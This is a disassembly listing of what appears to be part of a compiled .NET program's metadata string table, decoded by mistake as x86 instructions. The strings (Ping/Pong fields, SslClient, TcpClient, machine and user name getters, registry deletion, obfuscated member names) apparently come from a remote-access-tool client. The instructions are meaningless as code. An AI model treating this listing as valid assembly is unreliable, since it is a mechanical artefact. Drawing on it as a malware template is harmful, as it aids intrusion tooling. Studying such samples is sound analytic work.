  4084f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f1:	67 46                	addr16 inc %esi
  4084f3:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  4084fa:	65 61                	gs popa
  4084fc:	64 65 72 53          	fs gs jb 0x408553
  408500:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  408507:	42                   	inc    %edx
  408508:	61                   	popa
  408509:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40850c:	6e                   	outsb  %ds:(%esi),(%dx)
  40850d:	67 46                	addr16 inc %esi
  40850f:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  408516:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  40851d:	42                   	inc    %edx
  40851e:	61                   	popa
  40851f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408522:	6e                   	outsb  %ds:(%esi),(%dx)
  408523:	67 46                	addr16 inc %esi
  408525:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  40852c:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408530:	61                   	popa
  408531:	74 65                	je     0x408598
  408533:	50                   	push   %eax
  408534:	6f                   	outsl  %ds:(%esi),(%dx)
  408535:	6e                   	outsb  %ds:(%esi),(%dx)
  408536:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  40853c:	61                   	popa
  40853d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408540:	6e                   	outsb  %ds:(%esi),(%dx)
  408541:	67 46                	addr16 inc %esi
  408543:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  40854a:	6e                   	outsb  %ds:(%esi),(%dx)
  40854b:	74 65                	je     0x4085b2
  40854d:	72 76                	jb     0x4085c5
  40854f:	61                   	popa
  408550:	6c                   	insb   (%dx),%es:(%edi)
  408551:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408556:	61                   	popa
  408557:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40855a:	6e                   	outsb  %ds:(%esi),(%dx)
  40855b:	67 46                	addr16 inc %esi
  40855d:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  408564:	75 66                	jne    0x4085cc
  408566:	66 65 72 3e          	data16 gs jb 0x4085a8
  40856a:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40856e:	61                   	popa
  40856f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408572:	6e                   	outsb  %ds:(%esi),(%dx)
  408573:	67 46                	addr16 inc %esi
  408575:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  40857c:	66 66 73 65          	data16 data16 jae 0x4085e5
  408580:	74 3e                	je     0x4085c0
  408582:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408586:	61                   	popa
  408587:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40858a:	6e                   	outsb  %ds:(%esi),(%dx)
  40858b:	67 46                	addr16 inc %esi
  40858d:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  408594:	73 6c                	jae    0x408602
  408596:	43                   	inc    %ebx
  408597:	6c                   	insb   (%dx),%es:(%edi)
  408598:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  40859f:	5f                   	pop    %edi
  4085a0:	42                   	inc    %edx
  4085a1:	61                   	popa
  4085a2:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4085a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4085a6:	67 46                	addr16 inc %esi
  4085a8:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  4085af:	63 70 43             	arpl   %esi,0x43(%eax)
  4085b2:	6c                   	insb   (%dx),%es:(%edi)
  4085b3:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4085ba:	5f                   	pop    %edi
  4085bb:	42                   	inc    %edx
  4085bc:	61                   	popa
  4085bd:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4085c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4085c1:	67 46                	addr16 inc %esi
  4085c3:	69 65 6c 64 00 6c 53 	imul   $0x536c0064,0x6c(%ebp),%esp
  4085ca:	57                   	push   %edi
  4085cb:	62 52 75             	bound  %edx,0x75(%edx)
  4085ce:	54                   	push   %esp
  4085cf:	76 78                	jbe    0x408649
  4085d1:	79 6d                	jns    0x408640
  4085d3:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  4085d7:	70 65                	jo     0x40863e
  4085d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4085da:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4085de:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  4085e5:	61 
  4085e6:	6c                   	insb   (%dx),%es:(%edi)
  4085e7:	75 65                	jne    0x40864e
  4085e9:	4b                   	dec    %ebx
  4085ea:	69 6e 64 00 4b 76 4d 	imul   $0x4d764b00,0x64(%esi),%ebp
  4085f1:	56                   	push   %esi
  4085f2:	7a 70                	jp     0x408664
  4085f4:	59                   	pop    %ecx
  4085f5:	63 59 6f             	arpl   %ebx,0x6f(%ecx)
  4085f8:	64 00 4c 44 51       	add    %cl,%fs:0x51(%esp,%eax,2)
  4085fd:	51                   	push   %ecx
  4085fe:	62 72 64             	bound  %esi,0x64(%edx)
  408601:	55                   	push   %ebp
  408602:	6d                   	insl   (%dx),%es:(%edi)
  408603:	6f                   	outsl  %ds:(%esi),(%dx)
  408604:	43                   	inc    %ebx
  408605:	71 64                	jno    0x40866b
  408607:	00 69 54             	add    %ch,0x54(%ecx)
  40860a:	6c                   	insb   (%dx),%es:(%edi)
  40860b:	61                   	popa
  40860c:	54                   	push   %esp
  40860d:	69 44 44 6d 79 4b 72 	imul   $0x42724b79,0x6d(%esp,%eax,2),%eax
  408614:	42 
  408615:	4b                   	dec    %ebx
  408616:	65 00 43 77          	add    %al,%gs:0x77(%ebx)
  40861a:	5a                   	pop    %edx
  40861b:	6f                   	outsl  %ds:(%esi),(%dx)
  40861c:	4a                   	dec    %edx
  40861d:	62 50 75             	bound  %edx,0x75(%eax)
  408620:	4a                   	dec    %edx
  408621:	4b                   	dec    %ebx
  408622:	4e                   	dec    %esi
  408623:	65 4e                	gs dec %esi
  408625:	65 00 64 47 68       	add    %ah,%gs:0x68(%edi,%eax,2)
  40862a:	79 44                	jns    0x408670
  40862c:	53                   	push   %ebx
  40862d:	6d                   	insl   (%dx),%es:(%edi)
  40862e:	43                   	inc    %ebx
  40862f:	6a 75                	push   $0x75
  408631:	44                   	inc    %esp
  408632:	49                   	dec    %ecx
  408633:	5a                   	pop    %edx
  408634:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408638:	70 6c                	jo     0x4086a6
  40863a:	61                   	popa
  40863b:	63 65 00             	arpl   %esp,0x0(%ebp)
  40863e:	43                   	inc    %ebx
  40863f:	72 65                	jb     0x4086a6
  408641:	61                   	popa
  408642:	74 65                	je     0x4086a9
  408644:	49                   	dec    %ecx
  408645:	6e                   	outsb  %ds:(%esi),(%dx)
  408646:	73 74                	jae    0x4086bc
  408648:	61                   	popa
  408649:	6e                   	outsb  %ds:(%esi),(%dx)
  40864a:	63 65 00             	arpl   %esp,0x0(%ebp)
  40864d:	4e                   	dec    %esi
  40864e:	4e                   	dec    %esi
  40864f:	4b                   	dec    %ebx
  408650:	45                   	inc    %ebp
  408651:	5a                   	pop    %edx
  408652:	42                   	inc    %edx
  408653:	51                   	push   %ecx
  408654:	54                   	push   %esp
  408655:	6f                   	outsl  %ds:(%esi),(%dx)
  408656:	78 47                	js     0x40869f
  408658:	6e                   	outsb  %ds:(%esi),(%dx)
  408659:	65 48                	gs dec %eax
  40865b:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  408660:	74 5f                	je     0x4086c1
  408662:	4d                   	dec    %ebp
  408663:	6f                   	outsl  %ds:(%esi),(%dx)
  408664:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  408669:	6c                   	insb   (%dx),%es:(%edi)
  40866a:	65 4d                	gs dec %ebp
  40866c:	6f                   	outsl  %ds:(%esi),(%dx)
  40866d:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  408672:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  408679:	64 65 
  40867b:	00 45 6e             	add    %al,0x6e(%ebp)
  40867e:	74 65                	je     0x4086e5
  408680:	72 44                	jb     0x4086c6
  408682:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408686:	4d                   	dec    %ebp
  408687:	6f                   	outsl  %ds:(%esi),(%dx)
  408688:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  40868d:	79 70                	jns    0x4086ff
  40868f:	74 6f                	je     0x408700
  408691:	53                   	push   %ebx
  408692:	74 72                	je     0x408706
  408694:	65 61                	gs popa
  408696:	6d                   	insl   (%dx),%es:(%edi)
  408697:	4d                   	dec    %ebp
  408698:	6f                   	outsl  %ds:(%esi),(%dx)
  408699:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  40869e:	6d                   	insl   (%dx),%es:(%edi)
  40869f:	70 72                	jo     0x408713
  4086a1:	65 73 73             	gs jae 0x408717
  4086a4:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  4086ab:	00 43 69             	add    %al,0x69(%ebx)
  4086ae:	70 68                	jo     0x408718
  4086b0:	65 72 4d             	gs jb  0x408700
  4086b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b4:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  4086b9:	6c                   	insb   (%dx),%es:(%edi)
  4086ba:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  4086bf:	64 65 00 59 63       	fs add %bl,%gs:0x63(%ecx)
  4086c4:	66 65 74 6f          	data16 gs je 0x408737
  4086c8:	64 77 53             	fs ja  0x40871e
  4086cb:	78 79                	js     0x408746
  4086cd:	6d                   	insl   (%dx),%es:(%edi)
  4086ce:	58                   	pop    %eax
  4086cf:	70 65                	jo     0x408736
  4086d1:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4086d6:	65 74 65             	gs je  0x40873e
  4086d9:	53                   	push   %ebx
  4086da:	75 62                	jne    0x40873e
  4086dc:	4b                   	dec    %ebx
  4086dd:	65 79 54             	gs jns 0x408734
  4086e0:	72 65                	jb     0x408747
  4086e2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086e6:	74 5f                	je     0x408747
  4086e8:	4d                   	dec    %ebp
  4086e9:	65 73 73             	gs jae 0x40875f
  4086ec:	61                   	popa
  4086ed:	67 65 00 55 57       	add    %dl,%gs:0x57(%di)
  4086f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f3:	77 59                	ja     0x40874e
  4086f5:	41                   	inc    %ecx
  4086f6:	42                   	inc    %edx
  4086f7:	6d                   	insl   (%dx),%es:(%edi)
  4086f8:	49                   	dec    %ecx
  4086f9:	56                   	push   %esi
  4086fa:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  4086fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4086ff:	76 6f                	jbe    0x408770
  408701:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  408705:	45                   	inc    %ebp
  408706:	6e                   	outsb  %ds:(%esi),(%dx)
  408707:	75 6d                	jne    0x408776
  408709:	65 72 61             	gs jb  0x40876d
  40870c:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  408710:	49                   	dec    %ecx
  408711:	44                   	inc    %esp
  408712:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  408719:	6c                   	insb   (%dx),%es:(%edi)
  40871a:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  40871f:	6f                   	outsl  %ds:(%esi),(%dx)
  408720:	75 62                	jne    0x408784
  408722:	6c                   	insb   (%dx),%es:(%edi)
  408723:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408727:	74 5f                	je     0x408788
  408729:	48                   	dec    %eax
  40872a:	61                   	popa
  40872b:	6e                   	outsb  %ds:(%esi),(%dx)
  40872c:	64 6c                	fs insb (%dx),%es:(%edi)
  40872e:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408732:	6e                   	outsb  %ds:(%esi),(%dx)
  408733:	74 69                	je     0x40879e
  408735:	6d                   	insl   (%dx),%es:(%edi)
  408736:	65 46                	gs inc %esi
  408738:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  40873f:	64 6c                	fs insb (%dx),%es:(%edi)
  408741:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408745:	74 4d                	je     0x408794
  408747:	6f                   	outsl  %ds:(%esi),(%dx)
  408748:	64 75 6c             	fs jne 0x4087b7
  40874b:	65 48                	gs dec %eax
  40874d:	61                   	popa
  40874e:	6e                   	outsb  %ds:(%esi),(%dx)
  40874f:	64 6c                	fs insb (%dx),%es:(%edi)
  408751:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408755:	6e                   	outsb  %ds:(%esi),(%dx)
  408756:	74 69                	je     0x4087c1
  408758:	6d                   	insl   (%dx),%es:(%edi)
  408759:	65 54                	gs push %esp
  40875b:	79 70                	jns    0x4087cd
  40875d:	65 48                	gs dec %eax
  40875f:	61                   	popa
  408760:	6e                   	outsb  %ds:(%esi),(%dx)
  408761:	64 6c                	fs insb (%dx),%es:(%edi)
  408763:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408767:	74 54                	je     0x4087bd
  408769:	79 70                	jns    0x4087db
  40876b:	65 46                	gs inc %esi
  40876d:	72 6f                	jb     0x4087de
  40876f:	6d                   	insl   (%dx),%es:(%edi)
  408770:	48                   	dec    %eax
  408771:	61                   	popa
  408772:	6e                   	outsb  %ds:(%esi),(%dx)
  408773:	64 6c                	fs insb (%dx),%es:(%edi)
  408775:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  408779:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408780:	65 
  408781:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  408785:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  40878c:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  408793:	6e 
  408794:	52                   	push   %edx
  408795:	6f                   	outsl  %ds:(%esi),(%dx)
  408796:	6c                   	insb   (%dx),%es:(%edi)
  408797:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  40879b:	6e                   	outsb  %ds:(%esi),(%dx)
  40879c:	64 6f                	outsl  %fs:(%esi),(%dx)
  40879e:	77 73                	ja     0x408813
  4087a0:	42                   	inc    %edx
  4087a1:	75 69                	jne    0x40880c
  4087a3:	6c                   	insb   (%dx),%es:(%edi)
  4087a4:	74 49                	je     0x4087ef
  4087a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4087a7:	52                   	push   %edx
  4087a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a9:	6c                   	insb   (%dx),%es:(%edi)
  4087aa:	65 00 62 56          	add    %ah,%gs:0x56(%edx)
  4087ae:	52                   	push   %edx
  4087af:	47                   	inc    %edi
  4087b0:	70 44                	jo     0x4087f6
  4087b2:	54                   	push   %esp
  4087b3:	6b 71 52 72          	imul   $0x72,0x52(%ecx),%esi
  4087b7:	6c                   	insb   (%dx),%es:(%edi)
  4087b8:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087bc:	74 5f                	je     0x40881d
  4087be:	4d                   	dec    %ebp
  4087bf:	61                   	popa
  4087c0:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  4087c7:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4087cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4087cc:	63 65 73             	arpl   %esp,0x73(%ebp)
  4087cf:	73 4d                	jae    0x40881e
  4087d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4087d2:	64 75 6c             	fs jne 0x408841
  4087d5:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4087d9:	74 5f                	je     0x40883a
  4087db:	57                   	push   %edi
  4087dc:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4087e3:	79 6c                	jns    0x408851
  4087e5:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4087e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ea:	63 65 73             	arpl   %esp,0x73(%ebp)
  4087ed:	73 57                	jae    0x408846
  4087ef:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4087f6:	79 6c                	jns    0x408864
  4087f8:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087fc:	74 5f                	je     0x40885d
  4087fe:	4e                   	dec    %esi
  4087ff:	61                   	popa
  408800:	6d                   	insl   (%dx),%es:(%edi)
  408801:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408805:	74 5f                	je     0x408866
  408807:	46                   	inc    %esi
  408808:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40880f:	00 
  408810:	73 65                	jae    0x408877
  408812:	74 5f                	je     0x408873
  408814:	46                   	inc    %esi
  408815:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40881c:	00 
  40881d:	47                   	inc    %edi
  40881e:	65 74 54             	gs je  0x408875
  408821:	65 6d                	gs insl (%dx),%es:(%edi)
  408823:	70 46                	jo     0x40886b
  408825:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40882c:	00 
  40882d:	47                   	inc    %edi
  40882e:	65 74 46             	gs je  0x408877
  408831:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408838:	00 
  408839:	67 65 74 5f          	addr16 gs je 0x40889c
  40883d:	4d                   	dec    %ebp
  40883e:	61                   	popa
  40883f:	63 68 69             	arpl   %ebp,0x69(%eax)
  408842:	6e                   	outsb  %ds:(%esi),(%dx)
  408843:	65 4e                	gs dec %esi
  408845:	61                   	popa
  408846:	6d                   	insl   (%dx),%es:(%edi)
  408847:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40884b:	74 5f                	je     0x4088ac
  40884d:	4f                   	dec    %edi
  40884e:	53                   	push   %ebx
  40884f:	46                   	inc    %esi
  408850:	75 6c                	jne    0x4088be
  408852:	6c                   	insb   (%dx),%es:(%edi)
  408853:	4e                   	dec    %esi
  408854:	61                   	popa
  408855:	6d                   	insl   (%dx),%es:(%edi)
  408856:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40885a:	74 5f                	je     0x4088bb
  40885c:	46                   	inc    %esi
  40885d:	75 6c                	jne    0x4088cb
  40885f:	6c                   	insb   (%dx),%es:(%edi)
  408860:	4e                   	dec    %esi
  408861:	61                   	popa
  408862:	6d                   	insl   (%dx),%es:(%edi)
  408863:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408867:	74 5f                	je     0x4088c8
  408869:	55                   	push   %ebp
  40886a:	73 65                	jae    0x4088d1
  40886c:	72 4e                	jb     0x4088bc
  40886e:	61                   	popa
  40886f:	6d                   	insl   (%dx),%es:(%edi)
  408870:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  408874:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  408878:	6f                   	outsl  %ds:(%esi),(%dx)
  408879:	73 74                	jae    0x4088ef
  40887b:	4e                   	dec    %esi
  40887c:	61                   	popa
  40887d:	6d                   	insl   (%dx),%es:(%edi)
  40887e:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  408883:	65 54                	gs push %esp
  408885:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  40888c:	5f                   	pop    %edi
  40888d:	4c                   	dec    %esp
  40888e:	61                   	popa
  40888f:	73 74                	jae    0x408905
  408891:	57                   	push   %edi
  408892:	72 69                	jb     0x4088fd
  408894:	74 65                	je     0x4088fb
  408896:	54                   	push   %esp
  408897:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  40889e:	6e                   	outsb  %ds:(%esi),(%dx)
  40889f:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  4088a6:	54                   	push   %esp
  4088a7:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  4088ae:	74 65                	je     0x408915
  4088b0:	4c                   	dec    %esp
  4088b1:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  4088b8:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  4088bb:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  4088bf:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  4088c6:	6d                   	insl   (%dx),%es:(%edi)
  4088c7:	65 54                	gs push %esp
  4088c9:	79 70                	jns    0x40893b
  4088cb:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4088cf:	74 5f                	je     0x408930
  4088d1:	56                   	push   %esi
  4088d2:	61                   	popa
  4088d3:	6c                   	insb   (%dx),%es:(%edi)
  4088d4:	75 65                	jne    0x40893b
  4088d6:	54                   	push   %esp
  4088d7:	79 70                	jns    0x408949
  4088d9:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4088dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4088de:	74 6f                	je     0x40894f
  4088e0:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4088e3:	54                   	push   %esp
  4088e4:	79 70                	jns    0x408956
  4088e6:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4088ea:	74 54                	je     0x408940
  4088ec:	79 70                	jns    0x40895e
  4088ee:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  4088f2:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4088f5:	74 54                	je     0x40894b
  4088f7:	79 70                	jns    0x408969
  4088f9:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4088fd:	6c                   	insb   (%dx),%es:(%edi)
  4088fe:	65 53                	gs push %ebx
  408900:	68 61 72 65 00       	push   $0x657261
  408905:	53                   	push   %ebx
  408906:	79 73                	jns    0x40897b
  408908:	74 65                	je     0x40896f
  40890a:	6d                   	insl   (%dx),%es:(%edi)
  40890b:	2e 43                	cs inc %ebx
  40890d:	6f                   	outsl  %ds:(%esi),(%dx)
  40890e:	72 65                	jb     0x408975
  408910:	00 43 6c             	add    %al,0x6c(%ebx)
  408913:	6f                   	outsl  %ds:(%esi),(%dx)
  408914:	73 65                	jae    0x40897b
  408916:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  40891a:	70 6f                	jo     0x40898b
  40891c:	73 65                	jae    0x408983
  40891e:	00 50 61             	add    %dl,0x61(%eax)
  408921:	72 73                	jb     0x408996
  408923:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408927:	72 52                	jb     0x40897b
  408929:	65 76 65             	gs jbe 0x408991
  40892c:	72 73                	jb     0x4089a1
  40892e:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  408932:	30 39                	xor    %bh,(%ecx)
  408934:	43                   	inc    %ebx
  408935:	65 72 74             	gs jb  0x4089ac
  408938:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40893f:	00 43 72             	add    %al,0x72(%ebx)
  408942:	65 61                	gs popa
  408944:	74 65                	je     0x4089ab
  408946:	00 53 65             	add    %dl,0x65(%ebx)
  408949:	74 54                	je     0x40899f
  40894b:	68 72 65 61 64       	push   $0x64616572
  408950:	45                   	inc    %ebp
  408951:	78 65                	js     0x4089b8
  408953:	63 75 74             	arpl   %esi,0x74(%ebp)
  408956:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40895d:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  408962:	65 74 65             	gs je  0x4089ca
  408965:	00 43 61             	add    %al,0x61(%ebx)
  408968:	6c                   	insb   (%dx),%es:(%edi)
  408969:	6c                   	insb   (%dx),%es:(%edi)
  40896a:	53                   	push   %ebx
  40896b:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408972:	74 
  408973:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408977:	6d                   	insl   (%dx),%es:(%edi)
  408978:	70 69                	jo     0x4089e3
  40897a:	6c                   	insb   (%dx),%es:(%edi)
  40897b:	65 72 47             	gs jb  0x4089c5
  40897e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408980:	65 72 61             	gs jb  0x4089e4
  408983:	74 65                	je     0x4089ea
  408985:	64 41                	fs inc %ecx
  408987:	74 74                	je     0x4089fd
  408989:	72 69                	jb     0x4089f4
  40898b:	62 75 74             	bound  %esi,0x74(%ebp)
  40898e:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408993:	75 67                	jne    0x4089fc
  408995:	67 61                	addr16 popa
  408997:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40899b:	74 74                	je     0x408a11
  40899d:	72 69                	jb     0x408a08
  40899f:	62 75 74             	bound  %esi,0x74(%ebp)
  4089a2:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4089a6:	6d                   	insl   (%dx),%es:(%edi)
  4089a7:	56                   	push   %esi
  4089a8:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  4089af:	74 74                	je     0x408a25
  4089b1:	72 69                	jb     0x408a1c
  4089b3:	62 75 74             	bound  %esi,0x74(%ebp)
  4089b6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089ba:	73 65                	jae    0x408a21
  4089bc:	6d                   	insl   (%dx),%es:(%edi)
  4089bd:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4089c1:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4089c8:	72 
  4089c9:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4089d0:	73 73                	jae    0x408a45
  4089d2:	65 6d                	gs insl (%dx),%es:(%edi)
  4089d4:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4089d8:	72 61                	jb     0x408a3b
  4089da:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4089dd:	61                   	popa
  4089de:	72 6b                	jb     0x408a4b
  4089e0:	41                   	inc    %ecx
  4089e1:	74 74                	je     0x408a57
  4089e3:	72 69                	jb     0x408a4e
  4089e5:	62 75 74             	bound  %esi,0x74(%ebp)
  4089e8:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4089ed:	67 65 74 46          	addr16 gs je 0x408a37
  4089f1:	72 61                	jb     0x408a54
  4089f3:	6d                   	insl   (%dx),%es:(%edi)
  4089f4:	65 77 6f             	gs ja  0x408a66
  4089f7:	72 6b                	jb     0x408a64
  4089f9:	41                   	inc    %ecx
  4089fa:	74 74                	je     0x408a70
  4089fc:	72 69                	jb     0x408a67
  4089fe:	62 75 74             	bound  %esi,0x74(%ebp)
  408a01:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a05:	73 65                	jae    0x408a6c
  408a07:	6d                   	insl   (%dx),%es:(%edi)
  408a08:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  408a0c:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  408a13:	69 
  408a14:	6f                   	outsl  %ds:(%esi),(%dx)
  408a15:	6e                   	outsb  %ds:(%esi),(%dx)
  408a16:	41                   	inc    %ecx
  408a17:	74 74                	je     0x408a8d
  408a19:	72 69                	jb     0x408a84
  408a1b:	62 75 74             	bound  %esi,0x74(%ebp)
  408a1e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a22:	73 65                	jae    0x408a89
  408a24:	6d                   	insl   (%dx),%es:(%edi)
  408a25:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408a29:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a2b:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  408a31:	74 69                	je     0x408a9c
  408a33:	6f                   	outsl  %ds:(%esi),(%dx)
  408a34:	6e                   	outsb  %ds:(%esi),(%dx)
  408a35:	41                   	inc    %ecx
  408a36:	74 74                	je     0x408aac
  408a38:	72 69                	jb     0x408aa3
  408a3a:	62 75 74             	bound  %esi,0x74(%ebp)
  408a3d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a41:	73 65                	jae    0x408aa8
  408a43:	6d                   	insl   (%dx),%es:(%edi)
  408a44:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  408a48:	65 73 63             	gs jae 0x408aae
  408a4b:	72 69                	jb     0x408ab6
  408a4d:	70 74                	jo     0x408ac3
